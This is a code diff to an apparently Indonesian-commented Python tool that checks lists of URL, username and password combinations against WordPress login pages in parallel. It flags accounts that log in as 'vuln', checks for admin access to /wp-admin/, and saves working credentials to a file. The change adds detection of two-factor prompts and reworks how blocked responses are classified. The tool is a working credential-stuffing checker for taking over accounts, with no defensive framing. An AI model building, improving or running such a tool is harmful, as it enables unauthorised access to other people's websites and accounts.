@@ -59,17 +59,30 @@ def attempt_login(target_url, username, password):
     try:
         response = session.post(login_url, data=data, allow_redirects=True, timeout=15)
     except Exception:
-        return False, "blocked", None
+        # jika request sama sekali gagal (timeout, DNS, dll) anggap saja not_vuln
+        # "blocked" hanya dipakai untuk status HTTP tertentu (401/402/403/500)
+        return False, "not_vuln", None, False
 
     cookies = session.cookies.get_dict()
     login_final_url = response.url or ""
     has_logged_cookie = "wordpress_logged_in" in "".join(cookies.keys())
 
-    # jika tidak ada cookie login, anggap gagal / diblok
+    # deteksi indikasi 2FA pada halaman login
+    login_body = (response.text or "").lower()
+    twofa_phrases = [
+        "two-factor authentication",
+        "2fa verification code",
+        "two factor authentication",
+        "authentication code:",
+        "use a backup code",
+    ]
+    is_2fa = any(p in login_body for p in twofa_phrases)
+
+    # jika tidak ada cookie login, cek status code untuk menentukan blocked / not_vuln
     if not has_logged_cookie:
-        if response.status_code in (403, 429):
-            return False, "blocked", login_final_url
-        return False, "not_vuln", login_final_url
+        if response.status_code in (401, 402, 403, 500):
+            return False, "blocked", login_final_url, is_2fa
+        return False, "not_vuln", login_final_url, is_2fa
 
     # sudah login, cek akses langsung ke /wp-admin/
     admin_url = f"{base_url}/wp-admin/"
@@ -82,24 +95,29 @@ def attempt_login(target_url, username, password):
             "sorry, you are not allowed to access this page.",
             "you do not currently have privileges on this site",
             "you do not have sufficient permissions",
-            "The current user doesn't have the"
+            "the current user doesn't have the",
         ]
         forbidden = any(p in admin_body for p in forbidden_phrases)
+
+        # 2FA juga bisa muncul saat akses /wp-admin/
+        admin_twofa = any(p in admin_body for p in twofa_phrases)
+        is_2fa = is_2fa or admin_twofa
+
         is_admin = is_admin_url and not forbidden
     except Exception:
         admin_final_url = None
         is_admin = True
 
     status = "admin" if is_admin else "user"
-    return True, status, login_final_url
+    return True, status, login_final_url, is_2fa
 
 
 def process_target(line):
     url, user, password = parse_payload_line(line)
     if not url or not user or not password:
         return None
-    success, status, final_url = attempt_login(url, user, password)
-    return url, user, password, success, status, final_url
+    success, status, final_url, is_2fa = attempt_login(url, user, password)
+    return url, user, password, success, status, final_url, is_2fa
 
 
 def main():
@@ -158,10 +176,11 @@ def main():
             print("\033[J", end="")
         print(f"{BLUE}[ SCANNING ] {processed_count}/{total_targets} target selesai | Terakhir: {current_url}{RESET}")
         print(f"{YELLOW}Vuln: {vuln_count} | Not Vuln: {not_vuln_count} | Blocked: {blocked_count} | Admin: {admin_count} | User: {user_count}{RESET}")
-        for ts, url_v, user_v, pass_v, role in vuln_entries:
+        for ts, url_v, user_v, pass_v, role, is_2fa in vuln_entries:
             label = "ADMIN" if role == "admin" else "USER"
             color = RED if role == "admin" else YELLOW
-            print(f"{color}[{ts}] [{label}] {url_v} | {user_v}:{pass_v}{RESET}")
+            extra = " [2FA Required]" if is_2fa else ""
+            print(f"{color}[{ts}] [{label}] {url_v} | {user_v}:{pass_v}{extra}{RESET}")
         block_height = 2 + len(vuln_entries)
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
@@ -172,7 +191,7 @@ def main():
             if not result:
                 render_block("-")
                 continue
-            url, user, password, success, status, final_url = result
+            url, user, password, success, status, final_url, is_2fa = result
             if status == "blocked":
                 blocked_count += 1
             elif success:
@@ -185,7 +204,7 @@ def main():
                     role = "user"
                     user_count += 1
                 ts = datetime.now().strftime("%H:%M:%S")
-                vuln_entries.append((ts, url, user, password, role))
+                vuln_entries.append((ts, url, user, password, role, is_2fa))
                 with output_lock:
                     with open(output_path, "a", encoding="utf-8") as f:
                         f.write(f"{url}:{user}:{password}\n")
